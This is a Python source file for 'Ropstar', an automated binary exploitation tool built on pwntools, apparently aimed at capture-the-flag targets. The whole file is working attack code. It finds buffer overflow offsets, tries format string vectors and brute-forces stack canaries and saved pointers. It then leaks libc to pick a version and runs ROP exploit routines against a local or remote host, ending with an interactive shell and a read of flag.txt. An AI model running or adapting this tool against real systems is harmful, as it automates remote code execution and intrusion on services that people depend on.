#!/usr/bin/python
from pwn import *
import requests
import sys
import os
import re
import argparse
import inspect
from leak import Leak
from exploit import Exploit
from utils import *
from colorama import Fore, Back, Style
import requests.packages.urllib3
from importlib import import_module
requests.packages.urllib3.disable_warnings()

# Author: xct

class Ropstar():
	def __init__(self, argv):
		parser = argparse.ArgumentParser(description='Pwn things, fast.')
		parser.add_argument('bin',help='target binary (local)')
		parser.add_argument('-rhost',help='target host')
		parser.add_argument('-rport', help='target port (required if -rhost is set)')		
		parser.add_argument('-o', help='specify offset manually, skips dynamic resolution')
		parser.add_argument('-p', help='use proxy, e.g. https://127.0.0.1:8080')
		parser.add_argument('-m', help='specify address of main method, in case there is no symbols')
		parser.add_argument('-xor', help='xor payload with given byte')		
		parser.add_argument('-win', help='specify win function address to call')	
		parser.add_argument('-magic', help='magic string that needs to be sent before the payload')
		parser.add_argument('-remote_offset', help='get offset remotely via observing responses (often required with canaries)', action='store_true')
		parser.add_argument('-plugins', help='run custom plugins')																											
		self.args = parser.parse_args()
		self.home = os.getlogin()
		if self.home == 'root':
			self.home = '/'+self.home
		else:
			self.home = '/home/'+self.home					
		# set context
		context.endian = "little"
		context.os = "linux"
		context.log_level = "debug"		
		context.timeout = 10
		self.t = Timeout()
		self.bname = self.args.bin
		self.binary = ELF(self.bname)
		self.arch = self.binary.get_machine_arch()
		log.info("Arch: "+self.arch)
		if self.arch  == 'i386':
			context.bits = 32
			context.arch = self.arch 
			context.kernel = self.arch 
			self.pattern_reg = "eip"
		else:
			context.bits = 64
			context.arch = self.arch 
			context.kernel = self.arch 
			self.pattern_reg = "rsp"	
		if self.args.remote_offset:
			if not self.args.rhost or not self.args.rport:
				log.failure("You need to specify rhost & rport to use remote_offset")
				sys.exit(0)	
		self.offset = -1
		if self.args.xor:
			self.xor = self.args.xor.decode('hex')
		self.leak = Leak(self)	
		self.exploit = Exploit(self)
		# identity + rot13 for now
		self.encodings = [lambda x: x, lambda x: rot13(x)]
		self.success_marker = ''
		# some config options		
		self.pattern_length = 2000
		self.magic_newline = False
		if self.args.magic and "\\n" in self.args.magic:
			self.args.magic = self.args.magic.replace("\\n","")
			self.magic_newline = True


	def run_plugins(self, proc):
		path = os.path.dirname(os.path.abspath(inspect.stack()[0][1]))+"/plugins/"
		files = [f for f in os.listdir(path) if f.endswith(".py") and not f == "__init__.py"]
		if len(files) > 0:
			log.info("Executing plugins: "+','.join(files))
			for file in files:
				p, _ = file.rsplit('.', 1)
				mod = import_module('plugins.'+p)
				_class  = getattr(mod, 'Plugin')
				plugin = _class(self.home)
				plugin.run(proc)


	def connect(self):
		''' Connects to remote or local binary
		'''
		p = None
		if self.args.rhost and self.args.rport:
			log.info("Using remote target "+self.args.rhost+":"+self.args.rport)	
			p = remote(self.args.rhost, self.args.rport)
		else:
			log.info("Using local target")	
			# env={'LD_PRELOAD': os.path.join(os.getcwd(), 'libc.so.6')}
			p = process(self.bname)
		return p


	def trigger(self, p, payload='', newline=True, recvall=False):
		''' function that puts payload into vulnerable buffer
		'''
		result = ''
		if self.args.magic:
			if not self.magic_newline:
				payload = self.args.magic + payload
			else:
				p.sendline(self.args.magic)
		if self.args.xor:
			payload = xor(payload, self.xor)
		if newline:
			p.sendline(payload)
		else:
			p.send(payload)
		try:
			if recvall:
				result = p.recvall(timeout=2)
			else:
				result = p.recvlines(numlines=100, timeout=2)
		except EOFError:
			pass
		return result


	def trigger_fmt(self, payload):	
		''' alternative to trigger for fmt string exploits (connects on its own)
		'''	
		p = self.connect()
		result = ''
		if self.args.magic:
			p.send(self.args.magic) # or sendline?
		p.sendline(payload)
		try:
			result = p.recvall()			
			pattern = "(START0[xX][0-9a-fA-F]{4,8}END)"
			m = re.search(pattern, result)			
			if m:
				result = m.groups(1)[0]
				log.info('FmtStr leak: '+result.strip("START").strip("END"))		
		except EOFError:
			pass
		p.close()
		return result


	def get_dynamic(self):
		if not self.args.remote_offset:
			return self.get_offset_local()
		else:
			return self.get_offset_remote()


	def get_offset_remote(self):
		''' Trial and error offset retrieval
		'''	
		for i in range(1, self.pattern_length):
			p = self.connect()
			try:
				result = self.trigger(p, cyclic(i))
				if self.success_marker not in result:
					self.offset = i-1
					log.success("Offset: "+str(self.offset))
					return True 	
			except EOFError:
				self.offset = i
				log.success("Offset: "+str(self.offset))
				return True
			p.close()		
		return False


	def get_offset_local(self):
		''' get offset with unique pattern
		'''
		for enc in self.encodings:
			p = process(self.bname)
			pattern = cyclic(self.pattern_length)
			pattern = enc(pattern)
			if self.args.magic:
				p.sendline(self.args.magic)			
			try:			
				p.sendline(pattern)
			except EOFError:
				log.failure("Can not get offset")
				return False
			p.wait()
			p.close()
			core = Coredump('./core')
			log.info("Fault: "+hex(core.fault_addr))
			addr = core.fault_addr & 0x000000ffffffff # have to make it 32 bit or cyclic crashes
			self.offset = cyclic_find(addr)
			# offset can not be higher than the pattern length
			if self.offset > self.pattern_length:
				continue
			if self.offset != -1:
				log.success("Offset: "+str(self.offset))
				return True
		log.failure("Can not get offset")
		return False


	def get_success_marker(self):
		'''
		'''
		p = self.connect()
		# get positive verifier, so we know what to expect if it doesn't crash
		result = self.trigger(p, 'test', newline=False, recvall=True)
		self.success_marker = result[-6:]
		log.info("Success marker: "+self.success_marker)
		p.close()


	def check_success(self, p):
		''' Check if we can execute shell commands
		'''
		try:
			p.sendline("id")
			out = p.recvline()
			log.success(out)
			if len(out) > 0:
				p.sendline("cat flag.txt")
				flag = p.recvline()
				if self.args.plugins:
					self.run_plugins(p)
				log.info('Time spent: '+str(round((time.time() - self.start_time),2))+'s')	
				p.interactive()
				return True
		except EOFError:
			log.failure("Failed")
			pass
		return False


	def debug(self, bp):
		gdb.attach(p, '''
		set follow-fork-mode child
		set breakpoint %s
		continue
		'''.format(bp))


	def main(self):
		self.start_time = time.time()

		# offset can also be given on command line		
		if not self.args.o:
			# resolve offset dynamically
			log.info("Getting offset")
			result = self.get_dynamic()
			if not result:
				log.info("Trying format string vector")
				# no offset found via simple overflow, maybe fmt string?
				offset = -1
				try:
					autofmt = FmtStr(self.trigger_fmt)
					if autofmt.offset == -1:
						log.failure("Could not find format string vector")
						return
					p = self.connect()					
					self.exploit.fmt(p, autofmt)
					p.close()							
					return
				except (IndexError, EOFError):
					log.failure("Probably not vulnerable to format string vector")
					return
		else:
			self.offset = int(self.args.o)
			log.info("Offset: "+str(self.offset))

		if self.binary.canary:
			# we need a marker for successful, non crashing requests to bruteforce values
			self.get_success_marker()
			log.info("Binary uses stack canary")
			log.info("Bruting canary, base ptr, intr ptr")	
			log.info("This can take a while, go grab a coffee")
			pause()
			payload = cyclic(self.offset)
			canary = self.leak.leak_qword(payload) # canary
			payload += canary
			base_ptr = self.leak.leak_qword(payload) # rbp
			payload += base_ptr
			instr_ptr = self.leak.leak_qword(payload) # rip
			payload += instr_ptr
			log.info("canary: "+hex(u64(canary)))
			log.info("base ptr: "+hex(u64(base_ptr)))
			log.info("instr ptr: "+hex(u64(instr_ptr)))
			log.info("You probably want to copy these")
			pause()	
			# at this point we can assume we have the values				
			self.canary = u64(canary)
			self.base_ptr = u64(base_ptr)
			self.instr_ptr = u64(instr_ptr)			
			'''	
			self.canary =  manual
			self.base_ptr = manual
			self.instr_ptr = manual
			'''
			addr = self.instr_ptr - (self.instr_ptr & 0xfff)	
			entry_offset = (self.binary.entry & 0xfffffffffffff000)
			self.binary.address =  addr - entry_offset			
			log.info("Base: "+hex(self.binary.address))

		if self.args.win:
			p = self.connect()	
			if self.exploit.win(p, self.args.win):
				p.close()
			return
		
		# leakless works for static & non-static binaries
		log.info("Checking for leakless exploitation")
		p = self.connect()	
		if self.exploit.bss(p):
			p.close()
			return
		# static compiled binaries get their gadgets from their elf
		if not self.binary.libc:
			if self.exploit.static(p):
				p.close()
				return
		p.close()

		# dynamic complied binary, try leaking libc & exploiting via libc
		log.info("Getting Leak")
		p = self.connect()		
		leak = self.leak.leak_libc(p)
		p.close()
		if len(leak) > 0:
			log.info("Getting libc version")
			versions = self.leak.ident_libc(leak)
			exploits = [self.exploit.bss, self.exploit.bss_execve, self.exploit.default]
			for version in versions:
				for exploit in exploits:
					p = self.connect()
					leak = self.leak.leak_libc(p)
					if len(leak) == 0:
						continue
					log.info("Using "+version)
					try:
						libc = ELF(version) # take first hit for now
					except IOError:
						log.failure("Could not load "+version+ "(skipping)")
						continue
					name, addr = leak.items()[0]
					libc.address = addr - libc.symbols[name]
					log.success("Libc base: {0}".format(hex(libc.address)))
					# exploit
					log.info("Running exploits")
					try:
						if exploit(p, libc):
							log.success("Done!")
							return				
					except EOFError:
						pass
				log.failure("Could not exploit target.")
				p.close()
		else:
			log.failure("Could not leak anything")


if __name__ == '__main__':
	logo = r"""
                          __            
   _________  ____  _____/ /_____ ______
  / ___/ __ \/ __ \/ ___/ __/ __ `/ ___/  
 / /  / /_/ / /_/ (__  ) /_/ /_/ / /    
/_/   \____/ .___/____/\__/\__,_/_/     
          /_/                           
    				xct@vulndev.io      
	"""
	print(Fore.RED+logo+Style.RESET_ALL)
	app = Ropstar(sys.argv)
	app.main()
